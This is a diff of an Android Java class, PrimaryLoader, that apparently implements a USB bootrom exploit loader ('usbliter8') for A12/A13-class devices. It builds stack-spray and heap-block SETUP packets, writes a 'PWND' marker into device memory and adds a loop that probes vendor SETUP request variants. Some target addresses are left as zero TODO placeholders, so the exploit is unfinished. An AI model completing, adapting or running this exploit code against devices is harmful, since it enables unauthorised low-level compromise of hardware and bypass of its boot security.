@@ -17,8 +17,27 @@ import java.util.Arrays;
 
 public class PrimaryLoader implements USBDevHandler {
     
+    // --- usbliter8-specific placeholders (fill with target device values) ---
+    private static final long RCM_PAYLOAD_ADDR = 0x0L;      // TODO: target payload address (A12/A13)
+    private static final long INTERMEZZO_LOCATION = 0x0L;   // TODO: intermezzo location
+    private static final long PAYLOAD_LOAD_BLOCK = 0x0L;    // TODO: payload block address
+    private static final int MAX_LENGTH = 0;                // TODO: max payload length
+    private static final int STACK_END = 0;                 // TODO: stack end sentinel
+
+    private static final long[] HEAP_BLOCKS = new long[] {
+            0x19C028BC0L,
+            0x19C029400L,
+            0x19C029480L,
+            0x19C029500L,
+            0x19C0295C0L
+    };
+    private static final String PWND_STR = " PWND:[usbliter8]";
+
     private static final int GET_STATUS_REQUEST_TYPE = UsbConstants.USB_DIR_IN | UsbConstants.USB_TYPE_STANDARD | 0x00; // standard device GET_STATUS
     private static final int SETUP_VENDOR_OUT_DEVICE = UsbConstants.USB_DIR_OUT | UsbConstants.USB_TYPE_VENDOR | 0x00; // vendor-specific, device recipient
+    private static final int SETUP_VENDOR_OUT_INTERFACE = UsbConstants.USB_DIR_OUT | UsbConstants.USB_TYPE_VENDOR | UsbConstants.USB_RECIP_INTERFACE;
+    private static final int SETUP_VENDOR_IN_DEVICE = UsbConstants.USB_DIR_IN | UsbConstants.USB_TYPE_VENDOR | 0x00;
+    private static final int SETUP_VENDOR_IN_INTERFACE = UsbConstants.USB_DIR_IN | UsbConstants.USB_TYPE_VENDOR | UsbConstants.USB_RECIP_INTERFACE;
     private static final int REQUEST_HEADER = 0x10;
     private static final int REQUEST_RESERVED = 0x11;
     private static final int REQUEST_STACK_SPRAY = 0x12;
@@ -39,11 +58,11 @@ public class PrimaryLoader implements USBDevHandler {
 
         try {
             // Use hardcoded constants only (do not read example files)
-            long rcmAddr = T8Constants.RCM_PAYLOAD_ADDR;
-            long intermezzoLoc = T8Constants.INTERMEZZO_LOCATION;
-            long payloadBlock = T8Constants.PAYLOAD_LOAD_BLOCK;
-            int maxLength = T8Constants.MAX_LENGTH;
-            int stackEnd = T8Constants.STACK_END;
+            long rcmAddr = RCM_PAYLOAD_ADDR;
+            long intermezzoLoc = INTERMEZZO_LOCATION;
+            long payloadBlock = PAYLOAD_LOAD_BLOCK;
+            int maxLength = MAX_LENGTH;
+            int stackEnd = STACK_END;
 
             Logger.log(context, "[*] Using constants: RCM_PAYLOAD_ADDR=0x" + Long.toHexString(rcmAddr) + " INTERMEZZO_LOCATION=0x" + Long.toHexString(intermezzoLoc) + " PAYLOAD_LOAD_BLOCK=0x" + Long.toHexString(payloadBlock) + " MAX_LENGTH=" + maxLength + " STACK_END=0x" + Integer.toHexString(stackEnd));
 
@@ -92,27 +111,41 @@ public class PrimaryLoader implements USBDevHandler {
                 Logger.log(context, "[+] Device status: " + Utils.bytesToHex(deviceStatus));
             }
 
-            // Single-SETUP diagnostic test: send one explicit SETUP packet and log result
-            try {
-                byte[] testPkt = makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
-                        REQUEST_HEADER,
-                        maxLength & 0xFFFF,
-                        (maxLength >> 16) & 0xFFFF,
-                        0);
-                int testRes = conn.controlTransfer(testPkt[0] & 0xFF,
-                        testPkt[1] & 0xFF,
-                        ((testPkt[3] & 0xFF) << 8) | (testPkt[2] & 0xFF),
-                        ((testPkt[5] & 0xFF) << 8) | (testPkt[4] & 0xFF),
-                        null,
-                        0,
-                        5000);
-                Logger.log(context, "[*] Single-SETUP test returned " + testRes);
-                if (testRes < 0) {
-                    Logger.log(context, "[-] Single-SETUP rejected by device (aborting full stream)");
-                    return;
+            // Diagnostic: try multiple SETUP variants (OUT/IN × device/interface)
+            int[] testTypes = new int[] {
+                    SETUP_VENDOR_OUT_DEVICE,
+                    SETUP_VENDOR_OUT_INTERFACE,
+                    SETUP_VENDOR_IN_DEVICE,
+                    SETUP_VENDOR_IN_INTERFACE
+            };
+
+            boolean anyOk = false;
+            for (int tt : testTypes) {
+                try {
+                    byte[] testPkt = makeSetupPacket(tt,
+                            REQUEST_HEADER,
+                            maxLength & 0xFFFF,
+                            (maxLength >> 16) & 0xFFFF,
+                            0);
+                    int testRes = conn.controlTransfer(testPkt[0] & 0xFF,
+                            testPkt[1] & 0xFF,
+                            ((testPkt[3] & 0xFF) << 8) | (testPkt[2] & 0xFF),
+                            ((testPkt[5] & 0xFF) << 8) | (testPkt[4] & 0xFF),
+                            null,
+                            0,
+                            10000);
+                    Logger.log(context, "[*] Single-SETUP test type=0x" + Integer.toHexString(tt) + " returned " + testRes);
+                    if (testRes >= 0) {
+                        anyOk = true;
+                        break;
+                    }
+                } catch (Exception e) {
+                    Logger.log(context, "[-] Exception during single-SETUP test type=0x" + Integer.toHexString(tt) + ": " + e.toString());
                 }
-            } catch (Exception e) {
-                Logger.log(context, "[-] Exception during single-SETUP test: " + e.toString());
+            }
+
+            if (!anyOk) {
+                Logger.log(context, "[-] All SETUP variants rejected by device (aborting full stream)");
                 return;
             }
 
@@ -259,17 +292,17 @@ public class PrimaryLoader implements USBDevHandler {
             }
             Logger.log(context, "[*] Added " + stackFillCount + " stack spray SETUP packets");
 
-            for (long blk : T8Constants.HEAP_BLOCKS) {
+            for (long blk : HEAP_BLOCKS) {
                 stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                         REQUEST_HEAP_BLOCK,
                         (int) (blk & 0xFFFF),
                         (int) ((blk >> 16) & 0xFFFF),
                         0));
             }
-            Logger.log(context, "[*] Added " + T8Constants.HEAP_BLOCKS.length + " heap block SETUP packets");
+            Logger.log(context, "[*] Added " + HEAP_BLOCKS.length + " heap block SETUP packets");
 
             try {
-                byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
+                byte[] pw = PWND_STR.getBytes("US-ASCII");
                 for (int i = 0; i < pw.length; i += 4) {
                     int chunk = 0;
                     for (int j = 0; j < 4 && i + j < pw.length; j++) {
